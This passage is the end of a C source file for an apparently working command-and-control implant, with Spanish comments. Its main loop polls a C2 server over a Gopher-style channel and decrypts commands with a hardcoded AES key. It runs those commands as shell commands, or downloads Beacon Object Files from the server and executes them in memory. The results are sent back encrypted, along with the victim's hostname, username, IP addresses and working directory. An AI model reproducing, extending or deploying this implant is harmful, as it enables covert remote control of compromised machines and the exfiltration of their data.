    free(sections);
    free(aligned_sizes); // ← Liberar array de tamaños
    cleanup_trampolines();
    return (entry != NULL) ? 0 : -1;
}

// === GET LOCAL IPs ===
char* get_local_ips() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0) {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq* ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char* result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++) {
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0) strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

// === DOWNLOAD BOF ===
unsigned char* download_bof(const char* bof_selector, size_t* out_size)
{
    char selector[512];
    snprintf(selector, sizeof(selector), "%s", bof_selector);
    char* payload = gopher_request(C2, 7070, selector, "GET", NULL);
    if (!payload) {
        *out_size = 0;
        return NULL;
    }

    // Extraer Base64 real (saltar 'i', truncar en \t)
    char* b64_start = payload;
    if (*b64_start == 'i') b64_start++;
    char* tab = strchr(b64_start, '\t');
    if (tab) *tab = '\0';

    // Decodificar Base64 directamente
    int bin_len = 0;
    unsigned char* binary = base64_decode(b64_start, &bin_len);
    free(payload);
    if (!binary) {
        *out_size = 0;
        return NULL;
    }
    *out_size = bin_len;
    return binary; // ya es binario, no string
}
// === RUN BOF AND CAPTURE ===
char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          char* args, int arglen, int* out_len)
{
    fprintf(stderr, "[DEBUG] run_bof_and_capture: ENTRY\n");
    fflush(stderr);

    // Limpiar buffer global ANTES de ejecutar
    g_output_len = 0;
    g_beacon_output[0] = '\0';

    fprintf(stderr, "[DEBUG] run_bof_and_capture: calling RunELF\n");
    fflush(stderr);

    // Ejecutar el BOF - esto escribe a g_beacon_output
    RunELF("go", elf_data, filesize, (unsigned char*)args, arglen);

    fprintf(stderr, "[DEBUG] run_bof_and_capture: RunELF returned\n");
    fprintf(stderr, "[DEBUG] run_bof_and_capture: g_output_len=%zu\n", g_output_len);
    fprintf(stderr, "[DEBUG] run_bof_and_capture: g_beacon_output='%s'\n", g_beacon_output);
    fflush(stderr);

    // Alocar y copiar el output del buffer global
    if (g_output_len == 0) {
        *out_len = 0;
        return strdup("");
    }

    char *output = malloc(g_output_len + 1);
    if (!output) {
        *out_len = 0;
        return strdup("");
    }

    memcpy(output, g_beacon_output, g_output_len);
    output[g_output_len] = '\0';
    *out_len = g_output_len;

    fprintf(stderr, "[DEBUG] run_bof_and_capture: EXIT with %d bytes\n", *out_len);
    fflush(stderr);

    return output;
}

// === MAIN ===
int main() {
    /* Fuerza line-buffering en stdout/stderr para que se imprima todo en tiempo real */
    setvbuf(stdout, NULL, _IOLBF, 0);
    setvbuf(stderr, NULL, _IOLBF, 0);

    printf("[*] Beacon starting...\n");
    fflush(stdout);
    srand(time(NULL));

    const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
    unsigned char AES_KEY[32];
    for (int i = 0; i < 32; i++) sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
    fprintf(stdout, "[DEBUG] AES key loaded\n");
    fflush(stdout);

    char full_url[512];
    snprintf(full_url, sizeof(full_url), "%s%s%s", C2, MALEABLE, CLIENT_ID);
    fprintf(stdout, "[DEBUG] Contact URL will be: %s\n", full_url);
    fflush(stdout);

    int cycle = 0;
    while (1) {
        cycle++;
        fprintf(stdout, "[*] === LOOP %d ======================================\n", cycle);
        fflush(stdout);

        /* ---------- GET ---------- */
        fprintf(stdout, "[*] Checking for new command...\n");
        fflush(stdout);

        char* b64_resp = gopher_request(C2, 7070, MALEABLE CLIENT_ID, "GET", NULL);
        if (!b64_resp || strlen(b64_resp) == 0) {
            fprintf(stdout, "[-] Empty or NULL response from C2\n");
            if (b64_resp) free(b64_resp);
            sleep(6);
            continue;
        }

        /* Quitamos el tabulador si existe (mismo código que tenías) */
        char* tab = strchr(b64_resp, '\t');
        if (tab) *tab = '\0';

        fprintf(stdout, "[+] Raw C2 response (Base64): %.64s...\n", b64_resp);
        fflush(stdout);

        int enc_len = 0;
        unsigned char* encrypted = base64_decode(b64_resp, &enc_len);
        free(b64_resp);
        if (!encrypted || enc_len < 16) {
            free(encrypted);
            sleep(6);
            continue;
        }

        unsigned char* iv  = encrypted;
        unsigned char* cit = encrypted + 16;
        int plain_len = 0;
        char* plaintext = (char*)aes256_cfb_decrypt(AES_KEY, iv, cit, enc_len - 16, &plain_len);
        free(encrypted);
        if (!plaintext) {
            fprintf(stdout, "[-] AES decrypt failed\n");
            sleep(6);
            continue;
        }
        plaintext[plain_len] = '\0';
char* command = plaintext;

        if (strlen(command) == 0) {
            free(plaintext);
            sleep(6);
            continue;
        }

        printf("[*] Received command: '%s'\n", command);

        int output_len = 0;
        char* output = NULL;

        if (strncmp(command, "bof:", 4) == 0) {
            char* payload = command + 4;
            while (*payload == ' ') payload++; // Saltar espacios iniciales

            char* space = strchr(payload, ' ');
            char* bof_url;
            char* bof_args = NULL;
            int bof_arglen = 0;

            if (space) {
                *space = '\0'; // Terminar la cadena de la URL
                bof_url = payload;
                bof_args = space + 1;

                // Opcional: eliminar comillas simples o dobles al inicio y final
                if ((bof_args[0] == '"' || bof_args[0] == '\'') && bof_args[0] == bof_args[strlen(bof_args)-1]) {
                    bof_args[strlen(bof_args)-1] = '\0';
                    bof_args++;
                }
                bof_arglen = strlen(bof_args);
            } else {
                bof_url = payload;
                bof_args = ""; // o NULL, pero tu BOF espera una cadena
                bof_arglen = 0;
            }

            printf("[*] BOF URL: %s\n", bof_url);
            if (bof_arglen > 0) {
                printf("[*] BOF args: %s\n", bof_args);
            }

            size_t bof_size = 0;
            unsigned char* bof_data = download_bof(bof_url, &bof_size);
            if (!bof_data || bof_size == 0) {
                output = strdup("[!] Failed to download BOF");
                output_len = strlen(output);
            } else {
                output = run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, &output_len);
                free(bof_data);
            }
        } else {
            output = exec_cmd(command, &output_len);
            if (!output) output = strdup("Command failed or no output");
        }

        fprintf(stdout, "[*] Raw output (%d bytes):\n%.*s\n", output_len, output_len, output);
        fflush(stdout);

        /* ---------- RESPOND (mismo código que tenías) ---------- */
        char hostname[256];
        gethostname(hostname, sizeof(hostname) - 1);
        struct passwd *pw = getpwuid(getuid());
        char* user   = pw ? pw->pw_name : "unknown";
        char* ips    = get_local_ips();
        char* pwd    = getcwd(NULL, 0);
        if (!pwd) pwd = strdup("/");

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, "output", output);
        cJSON_AddStringToObject(root, "client", CLIENT_ID);
        cJSON_AddStringToObject(root, "command", plaintext);
        cJSON_AddNumberToObject(root, "pid", (double)getpid());
        cJSON_AddStringToObject(root, "hostname", hostname);
        cJSON_AddStringToObject(root, "ips", ips);
        cJSON_AddStringToObject(root, "user", user);
        cJSON_AddStringToObject(root, "discovered_ips", "");
        cJSON_AddNullToObject(root, "result_portscan");
        cJSON_AddStringToObject(root, "result_pwd", pwd);

        char* json_str = cJSON_PrintUnformatted(root);
        cJSON_Delete(root);
        fprintf(stdout, "[DEBUG] JSON to send: %.256s\n", json_str);
        fflush(stdout);

        /* ciframos y enviamos */
        unsigned char iv_out[16];
        RAND_bytes(iv_out, 16);
        int encrypted_len = 0;
        unsigned char* enc_resp = aes256_cfb_encrypt(AES_KEY, iv_out,
                                                    (unsigned char*)json_str,
                                                    strlen(json_str),
                                                    &encrypted_len);
        if (enc_resp) {
            unsigned char* full_enc = malloc(16 + encrypted_len);
            memcpy(full_enc, iv_out, 16);
            memcpy(full_enc + 16, enc_resp, encrypted_len);
            char* b64_resp = base64_encode(full_enc, 16 + encrypted_len);

            fprintf(stdout, "[*] Sending response (b64 first 64 bytes): %.64s...\n", b64_resp);
            fflush(stdout);

            char* ack = gopher_request(C2, 7070, NULL, "POST", b64_resp);
            if (ack) {
                fprintf(stdout, "[*] C2 acknowledged: %.128s\n", ack);
                fflush(stdout);
                free(ack);
            } else {
                fprintf(stdout, "[-] No ACK from C2 (timeout?)\n");
                fflush(stdout);
            }

            free(b64_resp);
            free(full_enc);
            free(enc_resp);
        }

        free(json_str);
        free(output);
        free(plaintext);
        free(ips);
        free(pwd);

        sleep(6);
    }
    return 0;
}
